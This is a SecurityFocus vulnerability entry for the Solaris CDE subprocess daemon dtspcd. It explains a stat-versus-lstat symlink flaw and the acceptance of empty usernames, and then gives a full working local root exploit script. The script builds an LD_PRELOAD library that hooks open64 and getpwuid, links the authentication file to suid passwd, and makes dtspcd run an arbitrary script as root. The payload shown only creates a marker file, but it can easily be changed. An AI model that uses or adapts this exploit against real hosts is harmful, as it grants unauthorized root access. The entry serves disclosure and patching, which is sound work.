source: http://www.securityfocus.com/bid/636/info

This explanation is quoted from the initial post on this problem by Job De Hass. This message is available in its entirety in the 'Credit' section of this vulnerability entry.

The CDE subprocess daemon /usr/dt/bin/dtspcd contains an insufficient check on client credentials. The CDE subprocess daemon allows cross-platform invocation of applications. In order to authenticate the remote user, the daemon generates a filename which is to be created by the client and then is verified by the daemon. When verifying the created file, the daemon uses stat() instead of lstat() and is subsequently vulnerable to a symlink attack. Further more the daemon seems to allow empty usernames and then reverts to a publicly write-able directory (/var/dt/tmp). 

#!/bin/sh
#
# dtspaced
# Demonstration of local root hole with dtspcd.
# Job de Haas
# (c) 1999 ITSX bv
#
# Mechanism is as follows:
# - dtaction requests the action 'Execute' through dtspcd.
# - dtscpd request a filename to be created which it will check for
# owner/suid bit.
# - BUG1: dtspcd allows creation in a public directory (with empty
# username).
# - BUG2: and forgets to check if the file is a symlink.
# - dtaction will create a symlink to a suid root binary and reply.
# - dtspcd considers dtaction authenticated and executes requested file
# as root.
#
# suggested fix: use lstat or refuse a symlink and why allow an empty
# username?
#
# exploit uses a shared lib to replace some functions to do what we want.
# Note that these are not used by dtspcd but by dtaction. The script executed
# by dtaction as root creates a file /tmp/root_was_here.
#
# tested on Solaris 2.5.1, 2.6 and 7
#

if [ -f /tmp/root_was_here -o -d /tmp/root_was_here ]; then
echo "/tmp/root_was_here already exists"
exit
fi

if [ "X$DISPLAY" = "X" ]; then
echo "need to set DISPLAY"
exit
fi

cat > /tmp/dtspaced.c << EOF
#include <pwd.h>
#define O_CREAT 0x100
#define O_RDONLY 0

#if __SunOS_5_5_1
#define open64 open
#define _open64 _open
#endif

open64(const char * filename, int flag, int mode)
{
if ((flag & O_CREAT) && ( strstr( filename, "SPC") )) {
symlink( "/usr/bin/passwd", filename);
filename = (char *)strdup("/tmp/shit");
unlink(filename);
}
return(_open64(filename, flag, mode));
}

chmod(const char * filename, int mode)
{
_chmod( filename, mode);
return(0);
}

struct passwd *getpwuid(uid_t uid)
{
struct passwd *pw;

pw = (struct passwd *)_getpwuid(uid);
pw->pw_name = (char *)strdup("");
return(pw);
}
EOF

cat > /tmp/doit << EOF
#!/bin/sh
unset LD_PRELOAD
/usr/bin/touch /tmp/root_was_here
EOF

chmod a+x /tmp/doit

mkdir /tmp/.dt
cat > /tmp/.dt/hack.dt << EOF

set DtDbVersion=1.0

ACTION Execute
{
LABEL Execute
TYPE COMMAND
WINDOW_TYPE NO_STDIO
EXEC_STRING "%(File)Arg_1"File To Execute:"%"
DESCRIPTION The Execute action runs a shell script or binary executable. It prompts for options and arguments, and then executes the script or executable in a terminal window.
}
EOF

DTDATABASESEARCHPATH=/tmp/.dt
export DTDATABASESEARCHPATH

# make a copy of dtaction so it is not suid root and will accept LD_PRELOAD
cp /usr/dt/bin/dtaction /tmp

echo "Compiling shared lib..."
cc -c /tmp/dtspaced.c -o /tmp/dtspaced.o
ld -G /tmp/dtspaced.o -o /tmp/dtspaced.so

LD_PRELOAD=/tmp/dtspaced.so
export LD_PRELOAD

echo "Executing dtaction..."
/tmp/dtaction -execHost 127.0.0.1 Execute /tmp/doit
unset LD_PRELOAD

/bin/rm -f /tmp/doit /tmp/dtaction /tmp/shit /tmp/dtspaced.*
/bin/rm -rf /tmp/.dt

if [ -f /tmp/root_was_here ]; then
echo "created file /tmp/root_was_here"
else
echo "exploit failed..."
fi